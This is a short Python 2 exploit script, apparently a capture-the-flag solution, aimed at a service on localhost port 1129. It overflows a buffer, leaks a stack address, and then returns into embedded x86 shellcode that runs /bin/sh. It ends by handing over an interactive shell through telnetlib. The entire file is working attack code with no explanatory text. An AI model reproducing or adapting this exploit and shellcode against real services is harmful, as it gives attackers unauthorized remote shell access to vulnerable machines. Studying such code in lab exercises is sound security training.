from socket import *
import telnetlib
import struct

ip='127.0.0.1'
port=1129

s=socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))

t=telnetlib.Telnet()
t.sock=s

def recv_until(s,c):
        data=''
        while c not in data:
                data+=s.recv(1)
        return data

#shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
#shellcode+="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode+="\x68\x68\x2f\x62\x69\x6e\x89"
shellcode+="\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode+="\xcd\x80\x31\xc0\x40\xcd\x80"

print recv_until(s,':')
nops="\x90"*0x14
ret=struct.pack('I',0x08048087)

s.send(nops+ret)

leak0=struct.unpack("I",s.recv(4))[0]
print "leak0: "+str(hex(leak0))

leak1=struct.unpack("I",s.recv(4))[0]
print "leak1: "+str(hex(leak1))

leak2=struct.unpack('I',s.recv(4))[0]
print "leak2: "+str(hex(leak2))

leak3=struct.unpack("I",s.recv(4))[0]
print "leak3: "+str(hex(leak3))

leak4=struct.unpack('I',s.recv(4))[0]
print "leak4: "+str(hex(leak4))

ret=leak0+0x14

s.send('A'*0x14+struct.pack('I',ret)+shellcode)

t.interact()

s.close()

